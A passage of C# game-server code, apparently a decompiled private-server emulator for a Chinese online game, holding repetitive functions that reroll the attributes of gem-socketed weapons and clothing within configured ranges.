						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠武器传说ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠衣服属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠衣服属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num27 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num27 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num28 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num28 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num29 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num29 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						系统提示("属性已洗完美,请勿重复操作", 50, "温馨提示");
					}
					else
					{
						系统提示("恭喜少侠，属性已重洗成功", 50, "温馨提示");
					}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "属性重置出错! [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 重置宝珠衣服高级属性系统()
		{
			try
			{
				if (World.是否开启咕咕鸡属性重置 == 1)
				{
					Random random = new Random();
					string[] array = World.宝珠衣服高级属性.Split(';');
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num12 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num23 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num30 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num + 1, num12 + 1, num23 + 1, num30 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num31 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num32 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num31 + 1, Convert.ToInt32(array[3]), num32 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num33 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num34 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num35 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num33 + 1, Convert.ToInt32(array[3]), num34 + 1, num35 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num2 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num3 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num2 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), num3 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num4 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num4 + 1, Convert.ToInt32(array[3]), Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num5 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num6 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num5 + 1, num6 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num7 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num8 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num7 + 1, Convert.ToInt32(array[5]), num8 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num9 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num10 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num9 + 1, num10 + 1, Convert.ToInt32(array[5]), Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 == Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num11 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num13 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num14 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num11 + 1, num13 + 1, num14 + 1, Convert.ToInt32(array[7]), 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num15 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num16 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num17 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), num15 + 1, num16 + 1, num17 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num18 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num19 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num20 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num18 + 1, Convert.ToInt32(array[3]), num19 + 1, num20 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 != Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 != Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 == Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						int num21 = random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						int num22 = random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num24 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, num21 + 1, num22 + 1, Convert.ToInt32(array[5]), num24 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
					if (装备栏包裹[0].FLD_MAGIC1 == Convert.ToInt32(array[1]) && 装备栏包裹[0].FLD_MAGIC2 == Convert.ToInt32(array[3]) && 装备栏包裹[0].FLD_MAGIC3 != Convert.ToInt32(array[5]) && 装备栏包裹[0].FLD_MAGIC4 != Convert.ToInt32(array[7]))
					{
						减去物品(0, 1);
						random.Next(Convert.ToInt32(array[0]), Convert.ToInt32(array[1]));
						random.Next(Convert.ToInt32(array[2]), Convert.ToInt32(array[3]));
						int num25 = random.Next(Convert.ToInt32(array[4]), Convert.ToInt32(array[5]));
						int num26 = random.Next(Convert.ToInt32(array[6]), Convert.ToInt32(array[7]));
						AddItemWithProperties(World.宝珠衣服高级ID, 0, 1, 装备栏包裹[0].FLD_MAGIC0, Convert.ToInt32(array[1]), Convert.ToInt32(array[3]), num25 + 1, num26 + 1, 0, 0, 0, 0, 0);
						SavePlayerData();
					}
